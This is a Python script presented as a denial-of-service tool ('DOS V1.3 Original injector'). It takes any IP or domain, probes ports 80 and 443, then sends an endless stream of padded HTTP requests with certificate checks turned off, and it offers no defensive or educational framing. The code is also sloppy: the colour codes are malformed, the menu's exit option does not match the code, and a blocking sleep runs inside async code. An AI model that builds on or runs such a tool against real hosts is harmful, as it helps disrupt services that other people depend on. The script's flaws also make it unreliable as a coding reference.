#!/usr/bin/python3
import socket
import asyncio
import ssl
import re
import sys
import time
from urllib.parse import urlparse

def print_menu():

    GREEN = "\033[92m]"
    RED = "\033[91m]"
    RESET = "\033[0m"

    print(GREEN + r"""                                                                                                                 
▄▄▄▄▄▄     ▄▄▄▄▄    ▄▄▄▄▄▄▄
███▀▀██▄ ▄███████▄ █████▀▀▀
███  ███ ███   ███  ▀████▄ 
███  ███ ███▄▄▄███    ▀████ 
██████▀   ▀█████▀  ███████▀  V1.3 Original injector (Might be slow)
""" + RESET)
    print(GREEN + "1] Load Target (IP / Domain)" + RESET)
    print(RED + "2] Exit" + RESET)

async def resolve_host(hostname):
    try:
        return socket.gethostbyname(hostname)
    except:
        return None

def scan_port(ip, port, timeout=3):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            return result == 0
    except:
        return False

async def detect_web_port(ip):
    http_port = 80
    https_port = 443

    if scan_port(ip, http_port):
        print(f"Port {http_port} (HTTP) is open")
        return http_port
    elif scan_port(ip, https_port):
        print(f"Port {https_port} (HTTPS) is open")
        return https_port
    else:
        return 0

async def send_http_request(target_ip, port, use_https):
    packet_size = 64
    payload = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
    if len(payload) < packet_size:
        payload += b"X" * (packet_size - len(payload))
    payload = payload[:packet_size]

    try:
        if use_https:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(asyncio.open_connection(
                target_ip, port, ssl=context), timeout=10)
        else:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(target_ip, port), timeout=10)

        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(0.1)
        try:
            await reader.read(1024)
            print("Packet send | Successful connected")
            writer.close()
            await writer.wait_closed()
            return True
        except:
            print("Packet send | Successful connected (no response read)")
            writer.close()
            await writer.wait_closed()
            return True
    except Exception as e:
        print(f"Failed to send the packet | Error: {e}")
        return False

async def attack_server(target, port, use_https):
    success_count = 0
    fail_count = 0
    print(f"Starting DoS & connection to {target}:{port} | 64-byte packet | 1 pps")

    while True:
        try:
            start_time = time.time()
            success = await send_http_request(target, port, use_https)
            if success:
                success_count += 1
            else:
                fail_count += 1

            elapsed = time.time() - start_time
            sleep_time = max(0, 1.0 - elapsed)
            time.sleep(sleep_time)

        except KeyboardInterrupt:
            print(f"\nAttack stopped. Final stats: Success: {success_count}, Failed: {fail_count}")
            sys.exit(0)

async def main():
    while True:
        print_menu()
        choice = input("> ").strip()

        if choice == "0":
            print("Exiting...")
            sys.exit(0)
        elif choice == "1":
            target_input = input("Enter target IP or domain: ").strip()
            if not target_input:
                print("Invalid input")
                continue

            ip = await resolve_host(target_input)
            if not ip:
                print(f"Failed to resolve {target_input}")
                continue

            print(f"Resolved {target_input} to {ip}")
            port = await detect_web_port(ip)
            if port == 0:
                print("No valid web server port (80/443) found")
                continue

            use_https = port == 443
            await attack_server(ip, port, use_https)
        else:
            print("Invalid option")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nForced exit.")
        sys.exit(0)